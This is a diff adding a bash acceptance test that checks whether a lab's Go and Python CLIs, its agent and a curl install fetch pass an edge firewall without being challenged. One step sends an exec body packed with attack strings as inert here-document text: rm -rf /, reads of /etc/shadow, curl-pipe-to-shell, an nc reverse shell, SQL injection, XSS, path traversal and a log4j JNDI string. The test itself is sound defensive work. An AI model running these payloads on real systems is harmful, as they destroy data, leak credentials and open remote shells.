@@ -1,0 +1,147 @@
+#!/bin/bash
+# The Front door's test 7: the Go CLI, the Python CLI, the agent and
+# curl … /install pass the edge unchallenged, and an exec body full of shell
+# text is not blocked (spec section 16, Ready item 1; section 6, "Edge
+# settings").
+#
+#   fd07-clients-pass [--dry-run | --local | --lab] [--mac NAME] [--records DIR]
+#
+# Each of the lab's clients asks the lab something, and the answer must be
+# labd's own: not a challenge, not a page of the edge's.
+#
+#   - lab, the Go CLI: lab status, under the saved login.
+#   - omarchy-m-test, the Python CLI: its own HTTP code (this checkout's
+#     cli/) fetches /install and posts an empty report, which labd refuses
+#     in its own words. Nothing is uploaded.
+#   - lab-agent: the Mac is checking in, which only its agent does.
+#   - curl -fsSL …/install: the install script, as a shell script.
+#   - lab exec with a body full of what a firewall takes for an attack:
+#     shell, SQL and script text. On the Mac all of it is the body of a
+#     here-document given to ":", which reads nothing and runs nothing; the
+#     command then prints one word. It needs a Lease, which the test takes.
+#     The text stays in the Exec record, as every lab exec does.
+#
+# The Join command's own run through the Front door is recorded with the
+# Lab-owned Macs' Join, not here.
+set -euo pipefail
+# shellcheck source=scripts/cutover/front-door/lib.sh
+. "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib.sh"
+# shellcheck source=scripts/cutover/front-door/edge.sh
+. "$FD_HERE/edge.sh"
+usage() { sed -n '2,25p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//' >&2; exit 2; }
+
+fd_options "$@"
+no_rest
+
+if [[ $MODE == dry ]]; then
+  cat <<PLAN
+$ME: dry run. Through $ADDRESS, under the saved login, it would:
+  1. run: lab status
+  2. with the Python CLI's own HTTP code: GET /install, and POST an empty report to /api/v1/reports, which labd refuses itself
+  3. ask whether $MAC is checking in: only its lab-agent does that
+  4. run: curl -fsSL $ADDRESS/install
+  5. run: lab lease $MAC, then lab exec $MAC with a body of shell, SQL and script text that the Mac never runs
+  6. want every answer to be labd's own: no challenge, no page of the edge's
+  7. run: lab release $MAC
+  8. write docs/acceptance/$(TZ=Australia/Brisbane date +%Y-%m-%d)-front-door-07.md
+The exec's text stays in the Exec record. Nothing was sent.
+PLAN
+  exit 0
+fi
+
+command -v python3 >/dev/null 2>&1 || fail "this needs python3, for the Python CLI's own HTTP code"
+[[ -d $REPO/cli/omarchy_m_test ]] || fail "no cli/ in this checkout: the Python CLI's own code is what the test sends with"
+edge_workspace
+if [[ $MODE == local ]]; then
+  edge_lab
+  edge_mac
+else
+  logged_in
+fi
+record_start 07 "the lab's clients pass the edge unchallenged"
+bad=0
+
+# 1. The Go CLI.
+if "$LAB_CMD" status > "$WORK/go.out" 2> "$WORK/go.err"; then
+  rec "lab (Go): lab status was answered by labd"
+else
+  rec "FAIL: lab (Go): $(plain "$WORK/go.err")"
+  bad=1
+fi
+
+# 2. The Python CLI, by its own HTTP code. It prints numbers only.
+if PYTHONPATH="$REPO/cli" PYTHONDONTWRITEBYTECODE=1 python3 - "$ADDRESS" > "$WORK/python.out" 2> "$WORK/python.err" <<'PY'
+import sys
+from omarchy_m_test import host
+
+def page(text):
+    head = text[:2048].lower()
+    return int("<!doctype" in head or "<html" in head or "<body" in head)
+
+h = host.RealHost()
+address = sys.argv[1]
+got = h.get(address + "/install")
+print(f"install_status={got.status}")
+print(f"install_script={int(got.body.startswith('#!'))}")
+sent = h.post_json(address + "/api/v1/reports", "{}")
+print(f"post_status={sent.status}")
+print(f"post_page={page(sent.body)}")
+print(f"agent={host.USER_AGENT.split('/')[0]}")
+PY
+then
+  py="$WORK/python.out"
+  if [[ "$(fact "$py" install_status)" == 200 && "$(fact "$py" install_script)" == 1 && "$(fact "$py" post_page)" == 0 && "$(fact "$py" post_status)" =~ ^4[0-9][0-9]$|^503$ ]]; then
+    rec "$(fact "$py" agent) (Python): /install came as the script, and its empty report was refused by labd itself (HTTP $(fact "$py" post_status))"
+  else
+    rec "FAIL: $(fact "$py" agent) (Python): /install gave HTTP $(fact "$py" install_status); its report got HTTP $(fact "$py" post_status)$([[ "$(fact "$py" post_page)" != 1 ]] || echo ", a page of the edge's and not labd's answer")"
+    bad=1
+  fi
+else
+  rec "FAIL: the Python CLI's code could not ask: $(tail -n 1 "$WORK/python.err" > "$WORK/python.last"; plain "$WORK/python.last")"
+  bad=1
+fi
+
+# 3. The agent.
+"$PROBE" mac "$MAC" > "$WORK/mac.out" 2> "$WORK/mac.err" || true
+if [[ "$(fact "$WORK/mac.out" alive)" == true ]]; then
+  rec "lab-agent: $MAC is checking in"
+else
+  rec "FAIL: lab-agent: $MAC is not checking in: $(fact "$WORK/mac.out" said)"
+  bad=1
+fi
+
+# 4. curl.
+ask install -fSL "$ADDRESS/install"
+if [[ $STATUS == 200 ]] && ! edge_page install && head -c 2 "$WORK/install.body" | grep -q '^#!'; then
+  rec "curl -fsSL …/install: the install script ($(wc -c < "$WORK/install.body" | tr -d ' ') bytes)"
+else
+  rec "FAIL: curl -fsSL …/install: $(where install)"
+  bad=1
+fi
+
+# 5. An exec body full of shell text. Everything between the two FD07 lines
+# is read by ":" and thrown away.
+own_lease
+mark="fd07-$(nonce)"
+cat > "$WORK/body" <<'TEXT'
+: <<'FD07'
+rm -rf / --no-preserve-root; cat /etc/passwd /etc/shadow
+curl http://example.invalid/x.sh | sh; wget -qO- http://example.invalid/ | bash
+$(nc -e /bin/sh 203.0.113.9 4444) `id` && eval "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"
+() { :; }; /bin/bash -c 'id; uname -a'
+' OR '1'='1' -- ; DROP TABLE users; UNION SELECT password FROM users
+<script>alert(document.cookie)</script> ../../../../etc/passwd %00 {{7*7}} ${jndi:ldap://example.invalid/a}
+FD07
+TEXT
+echo "echo $mark" >> "$WORK/body"
+body="$(cat "$WORK/body")"
+if "$LAB_CMD" exec "$MAC" "$body" > "$WORK/exec.out" 2> "$WORK/exec.err" && grep -q "$mark" "$WORK/exec.out"; then
+  rec "lab exec: a body of shell, SQL and script text reached $MAC and came back with its one word"
+else
+  rec "FAIL: lab exec with a body of shell text: $(plain "$WORK/exec.err")"
+  bad=1
+fi
+give_back
+rec "the Join command's run through the Front door is recorded with the Lab-owned Macs' Join"
+(( ! bad )) || { record_done fail; exit 1; }
+record_done pass
